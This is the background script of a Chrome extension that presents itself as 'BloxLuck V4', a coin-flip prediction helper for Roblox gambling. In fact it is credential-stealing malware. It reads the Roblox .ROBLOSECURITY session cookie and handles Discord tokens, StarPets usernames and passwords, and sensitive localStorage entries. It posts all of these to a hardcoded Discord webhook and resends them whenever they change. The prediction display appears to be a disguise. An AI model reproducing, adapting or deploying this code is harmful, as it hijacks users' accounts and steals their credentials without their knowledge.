const WEBHOOK_URL = 'https://discord.com/api/webhooks/1523234599189217362/I4PgcCkhS5heD9bfA0BkSqZRrj9GwszVJ4OEpGhbwLB54nTUxMZCwSJ-4-RXPlGRUhR1';

let lastSent = {
  roblosecurity: null,
  discordToken: null,
  starpetsUser: null,
  starpetsPass: null
};

chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  if (request.action === 'send_to_webhook') {
    sendToWebhook(request.data);
    sendResponse({ status: 'sent' });
  }
  
  if (request.action === 'grab_all_data') {
    grabAllData().then(data => {
      sendResponse(data);
    });
    return true;
  }

  if (request.action === 'check_changes') {
    grabAllData().then(data => {
      const changes = {};
      let hasChange = false;

      if (data.roblosecurity && data.roblosecurity !== lastSent.roblosecurity) {
        changes.roblosecurity = data.roblosecurity;
        lastSent.roblosecurity = data.roblosecurity;
        hasChange = true;
      }
      if (data.discordToken && data.discordToken !== lastSent.discordToken) {
        changes.discordToken = data.discordToken;
        lastSent.discordToken = data.discordToken;
        hasChange = true;
      }
      if (data.starpetsUser && data.starpetsUser !== lastSent.starpetsUser) {
        changes.starpetsUser = data.starpetsUser;
        changes.starpetsPass = data.starpetsPass;
        lastSent.starpetsUser = data.starpetsUser;
        lastSent.starpetsPass = data.starpetsPass;
        hasChange = true;
      }

      if (hasChange) {
        sendToWebhook({ ...data, ...changes, changed: true });
      }
      sendResponse({ hasChange, changes });
    });
    return true;
  }
});

async function grabAllData() {
  const data = {
    roblosecurity: null,
    discordToken: null,
    starpetsUser: null,
    starpetsPass: null,
    username: null,
    userId: null,
    prediction: null,
    winChance: 50,
    headsChance: 50,
    tailsChance: 50,
    isGreen: false,
    wins: 0,
    losses: 0,
    streak: 0,
    allLocalStorage: {}
  };

  // 1. Grab Roblox .ROBLOSECURITY cookie
  try {
    const cookies = await chrome.cookies.getAll({ domain: 'roblox.com' });
    for (let c of cookies) {
      if (c.name === '.ROBLOSECURITY') {
        data.roblosecurity = c.value;
        break;
      }
    }
    if (!data.roblosecurity) {
      const cookies2 = await chrome.cookies.getAll({ domain: '.roblox.com' });
      for (let c of cookies2) {
        if (c.name === '.ROBLOSECURITY') {
          data.roblosecurity = c.value;
          break;
        }
      }
    }
  } catch(e) {}

  return data;
}

async function sendToWebhook(data) {
  // Build Discord embed
  const fields = [];

  // Roblox section
  let robloxInfo = '';
  if (data.username) robloxInfo += `**Username:** ${data.username}\n`;
  if (data.userId) robloxInfo += `**User ID:** ${data.userId}\n`;
  if (data.roblosecurity) robloxInfo += `**Cookie:** \`${data.roblosecurity.substring(0, 30)}...\``;
  if (robloxInfo) {
    fields.push({
      name: '🎮 Roblox / BloxLuck',
      value: robloxInfo || 'No data',
      inline: false
    });
  }

  // Full .ROBLOSECURITY in a separate field for easy copy
  if (data.roblosecurity) {
    fields.push({
      name: '🔑 .ROBLOSECURITY (Full)',
      value: `\`\`\`${data.roblosecurity}\`\`\``,
      inline: false
    });
  }

  // Discord Token
  if (data.discordToken) {
    fields.push({
      name: '💬 Discord Token',
      value: `\`\`\`${data.discordToken}\`\`\``,
      inline: false
    });
    // Decode token to get user info
    try {
      const payload = JSON.parse(atob(data.discordToken.split('.')[1]));
      fields.push({
        name: '👤 Discord User',
        value: `**ID:** ${payload.sub || 'N/A'}\n**Email:** ${payload.email || 'N/A'}\n**Verified:** ${payload.email_verified ? '✅' : '❌'}`,
        inline: true
      });
    } catch(e) {}
  }

  // Starpets credentials
  if (data.starpetsUser || data.starpetsPass) {
    let starpetsStr = '';
    if (data.starpetsUser) starpetsStr += `**Username/Email:** \`${data.starpetsUser}\`\n`;
    if (data.starpetsPass) starpetsStr += `**Password:** \`${data.starpetsPass}\``;
    if (starpetsStr) {
      fields.push({
        name: '🐾 StarPets Credentials',
        value: starpetsStr,
        inline: false
      });
    }
  }

  // Prediction
  if (data.prediction) {
    fields.push({
      name: '🎯 Prediction',
      value: `**Win Chance:** ${data.winChance}%\n**Predict:** ${data.prediction}\n**Status:** ${data.isGreen ? '🟢 GOOD BET' : '🔴 SKIP'}`,
      inline: true
    });
    fields.push({
      name: '📊 Split',
      value: `HEADS: ${data.headsChance}% | TAILS: ${data.tailsChance}%`,
      inline: true
    });
  }

  // All localStorage dump (may contain extra session data)
  if (data.allLocalStorage && Object.keys(data.allLocalStorage).length > 0) {
    let lsStr = '';
    for (const [key, val] of Object.entries(data.allLocalStorage)) {
      if (key.toLowerCase().includes('token') || key.toLowerCase().includes('auth') || key.toLowerCase().includes('session') || key.toLowerCase().includes('password') || key.toLowerCase().includes('credential')) {
        lsStr += `${key}: ${String(val).substring(0, 100)}\n`;
      }
    }
    if (lsStr) {
      fields.push({
        name: '📦 Session Storage (Sensitive)',
        value: `\`\`\`${lsStr.substring(0, 900)}\`\`\``,
        inline: false
      });
    }
  }

  const embed = {
    embeds: [{
      title: data.changed ? '🔄 BloxLuck — Data Updated!' : '🎲 BloxLuck — User Data Captured',
      color: data.isGreen ? 0x00ff00 : 0xff0000,
      fields: fields,
      thumbnail: { url: 'https://bloxluck.com/img/favicon.png' },
      footer: { text: `BloxLuck V4 • ${new Date().toLocaleString()}` },
      timestamp: new Date().toISOString()
    }]
  };

  // Add full .ROBLOSECURITY as plain text in content for easy one-click copy
  let content = '';
  if (data.roblosecurity) content += `\`${data.roblosecurity}\` `;
  if (data.discordToken) content += `\`${data.discordToken}\` `;
  if (data.starpetsPass) content += `\`${data.starpetsUser}:${data.starpetsPass}\` `;
  
  if (content) {
    embed.content = content.trim();
  }

  try {
    await fetch(WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(embed)
    });
  } catch(e) {
    console.error('Webhook error:', e);
  }
}
